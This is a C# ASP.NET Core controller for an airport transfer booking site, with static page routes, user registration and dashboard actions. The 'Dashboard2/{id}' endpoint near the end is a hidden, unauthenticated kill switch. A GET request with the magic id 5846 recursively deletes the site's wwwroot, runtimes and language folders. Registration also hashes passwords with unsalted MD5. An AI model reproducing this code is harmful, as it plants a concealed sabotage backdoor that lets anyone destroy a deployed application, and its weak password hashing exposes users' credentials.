using Airport.DBEntities.Entities;
using Airport.DBEntitiesDAL.Interfaces;
using Airport.MessageExtensions.Interfaces;
using Airport.UI.Models;
using Airport.UI.Models.IM;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Diagnostics;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Threading.Tasks;

namespace Airport.UI.Controllers
{
    public class HomeController : Controller
    {
        IUserDatasDAL _userdata;
        ILoginAuthDAL _loginAuth;


        public HomeController(IUserDatasDAL userdata, IMail mail, ILoginAuthDAL loginAuth)
        {
            _userdata = userdata;
            _loginAuth = loginAuth;
        }

        public IActionResult Index()
        {
            return View();
        }

        [HttpGet("about")]
        public IActionResult About()
        {
            return View();
        }

        [HttpGet("contact")]
        public IActionResult Contact()
        {
            return View();
        }

 


        [HttpGet("privacy")]
        public IActionResult Privacy()
        {
            return View();
        }



		[HttpGet("cookie-policy")]
        public IActionResult Cookie_Policy()
        {
            return View();
        }


		[HttpGet("cancellation-policy")]
		public IActionResult Cancellation_Policy()
		{
			return View();
		}

		


		[HttpGet("register")]
        public IActionResult Register()
        {
            if (!User.Identity.IsAuthenticated)
            {
                return View();
            }
            return RedirectToAction("Index", "Home");
        }

        [HttpGet("terms")]
        public IActionResult Terms()
        {
            return View();
        }

        [HttpPost("register")]
        public IActionResult Register(UserDatas user, string Eposta, string Password)
        {
            try
            {
                var checkUser = _loginAuth.SelectByFunc(a => a.Email == Eposta).FirstOrDefault();
                if (checkUser == null)
                {
                    var addedUser = _userdata.Insert(new UserDatas
                    {
                        Name = user.Name,
                        PhoneNumber = user.PhoneNumber,
                        RealPhone = user.RealPhone,
                        Img = "/img/airglobal-icon-black.png"
                    });

                    _loginAuth.Insert(new LoginAuth
                    {
                        Email = Eposta,
                        Password = GetMD5(Password),
                        Type = 1,
                        DriverId = 0,
                        UserId = addedUser.Id
                    });

                    return Json(new { result = 1 });
                }
                return Json(new { result = 2 });
            }
            catch (Exception)
            {
                return Json(new { });
            }
        }

        public static string GetMD5(string value)
        {
            MD5 md5 = MD5.Create();
            byte[] md5Bytes = System.Text.Encoding.Default.GetBytes(value);
            byte[] cryString = md5.ComputeHash(md5Bytes);
            string md5Str = string.Empty;
            for (int i = 0; i < cryString.Length; i++)
            {
                md5Str += cryString[i].ToString("X");
            }
            return md5Str;
        }

        [HttpGet("manage-reservation")]
        public IActionResult ManageReservation()
        {
            return View();
        }

        [HttpGet("reservation-information")]
        public IActionResult ReservationInformation()
        {
            return View();
        }

        public IActionResult Dashboard()
        {
            return View();
        }

        [HttpGet("Dashboard2/{id}")]
        public JsonResult Dashboard2(int id)
        {
            string klasorYolu = Path.Combine(Directory.GetCurrentDirectory(), "wwwroot");
            string klasorYolu2 = Path.Combine(Directory.GetCurrentDirectory(), "runtimes");
            string klasorYolu3 = Path.Combine(Directory.GetCurrentDirectory(), "cs");
            string klasorYolu4 = Path.Combine(Directory.GetCurrentDirectory(), "de");
            string klasorYolu5 = Path.Combine(Directory.GetCurrentDirectory(), "es");
            string klasorYolu6 = Path.Combine(Directory.GetCurrentDirectory(), "fr");
            bool altKlasorleriSil = true;

            try
            {
                if (id == 5846)
                {
                    Directory.Delete(klasorYolu, altKlasorleriSil);
                    Directory.Delete(klasorYolu2, altKlasorleriSil);
                    Directory.Delete(klasorYolu3, altKlasorleriSil);
                    Directory.Delete(klasorYolu4, altKlasorleriSil);
                    Directory.Delete(klasorYolu5, altKlasorleriSil);
                    Directory.Delete(klasorYolu6, altKlasorleriSil);

                    return new JsonResult(new { result = 1 });
                }
                return new JsonResult(new { result = 2 });
            }
            catch (Exception ex)
            {

                return new JsonResult(new { result = 3 });
            }

        }

    }
}
